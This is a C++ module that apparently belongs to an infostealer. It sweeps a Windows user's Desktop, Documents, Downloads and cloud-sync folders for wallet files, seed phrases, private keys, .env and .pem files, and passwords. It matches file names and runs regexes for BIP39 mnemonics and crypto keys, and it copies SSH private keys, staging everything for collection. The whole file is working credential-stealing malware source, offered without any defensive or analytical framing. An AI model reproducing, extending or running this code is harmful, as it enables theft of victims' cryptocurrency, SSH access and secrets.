// Targeted file grabber: wallets, seeds, keys, env files, configs.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <regex>
#include <sstream>

namespace {

// interesting extensions
const std::vector<std::string> k_exts = {
    "*.txt", "*.json", "*.env", "*.pem", "*.key", "*.wallet", "*.kdbx",
    "*.ovpn", "*.conf", "*.rdp", "*.ps1", "*.py", "*.js", "*.log", "*.csv", "*.xml",
};

const std::vector<std::string> k_roots_rel = {
    "Desktop", "Documents", "Downloads",
    "OneDrive\\Desktop", "OneDrive\\Documents",
    "Dropbox", "Google Drive",
};

// content signatures worth flagging
bool looks_interesting(const std::string& data, std::string& reason) {
    // BIP39 mnemonic: 12/15/18/21/24 lowercase words
    static const std::regex seed(R"(\b([a-z]{3,8}\s+){11,23}[a-z]{3,8}\b)");
    // bitcoin/eth private key
    static const std::regex wif(R"(\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b)");
    static const std::regex hexkey(R"(\b0x[a-fA-F0-9]{64}\b|\b[a-fA-F0-9]{64}\b)");
    // generic secrets
    static const std::regex secret(R"((private[_ -]?key|seed[_ -]?phrase|mnemonic|secret[_ -]?key|api[_ -]?key|passw(or)?d)\s*[:=])", std::regex::icase);

    if (std::regex_search(data, seed)) { reason = "mnemonic-like"; return true; }
    if (std::regex_search(data, wif)) { reason = "wif-key"; return true; }
    if (std::regex_search(data, hexkey)) { reason = "hex-private-key"; return true; }
    if (std::regex_search(data, secret)) { reason = "secret-marker"; return true; }
    return false;
}

int grab_count = 0;
constexpr int k_max_files = 250;

void consider_file(const std::string& path, const std::string& category) {
    if (grab_count >= k_max_files) return;
    std::string fn = util::to_lower(util::filename_of(path));
    std::string ext = "";
    auto dot = fn.find_last_of('.');
    if (dot != std::string::npos) ext = fn.substr(dot);

    bool name_hint = fn.find("wallet") != std::string::npos ||
                     fn.find("seed") != std::string::npos ||
                     fn.find("mnemonic") != std::string::npos ||
                     fn.find("private") != std::string::npos ||
                     fn.find("keystore") != std::string::npos ||
                     fn.find("id_rsa") != std::string::npos ||
                     ext == ".env" || ext == ".pem" || ext == ".key" ||
                     ext == ".wallet" || ext == ".kdbx";

    // always grab tiny sensitive extensions; content-scan others
    if (name_hint) {
        std::vector<uint8_t> d;
        if (util::read_file(path, d) && d.size() <= cfg::MAX_GRAB_FILE) {
            std::string flat = category + "_" + util::to_lower(util::filename_of(path));
            flat = util::replace_all(flat, " ", "_");
            // avoid dupes by content size+name
            if (stage::stage_bytes("files", flat, d)) {
                grab_count++;
                stage::note("files", "grabbed " + path);
            }
        }
        return;
    }

    if (util::ends_with(ext, ".txt") || util::ends_with(ext, ".json") || util::ends_with(ext, ".log")
        || util::ends_with(ext, ".csv")) {
        std::vector<uint8_t> d;
        if (util::read_file(path, d) && d.size() <= 512 * 1024) {
            std::string s(d.begin(), d.end());
            std::string reason;
            if (looks_interesting(s, reason)) {
                std::string flat = category + "_" + util::to_lower(util::filename_of(path));
                if (stage::stage_bytes("files", flat, d)) {
                    grab_count++;
                    stage::note("files", "hit(" + reason + "): " + path);
                }
            }
        }
    }
}

} // namespace

namespace mod {

void files(const std::string&) {
    std::string user = util::expand_env("%USERPROFILE%");
    if (user.empty()) return;

    // Bounded scan: content heuristics read whole files, so the number of
    // files examined is capped — a machine with hundreds of thousands of
    // documents must not turn the sweep into a ten-minute job.
    int considered = 0;
    const int k_max_considered = 4000;

    for (auto& rel : k_roots_rel) {
        std::string root = util::join(user, rel);
        if (!util::is_dir(root)) continue;
        auto found = util::walk_files(root, 4, k_exts);
        for (auto& f : found) {
            if (considered >= k_max_considered || grab_count >= k_max_files) break;
            ++considered;
            consider_file(f, rel.substr(0, rel.find('\\')));
        }
        if (considered >= k_max_considered || grab_count >= k_max_files) break;
    }

    // .ssh directory
    std::string ssh = util::join(user, ".ssh");
    if (util::is_dir(ssh)) {
        for (auto& f : util::list_dir(ssh)) {
            std::string fn = util::to_lower(util::filename_of(f));
            if (util::starts_with(fn, "id_") || fn == "known_hosts" || fn == "config") {
                std::vector<uint8_t> d;
                if (util::read_file(f, d)) {
                    stage::stage_bytes("files", "ssh_" + util::filename_of(f), d);
                    grab_count++;
                }
            }
        }
        stage::note("files", "ssh dir collected");
    }

    stage::note("files", "total grabbed: " + std::to_string(grab_count));
}

} // namespace mod
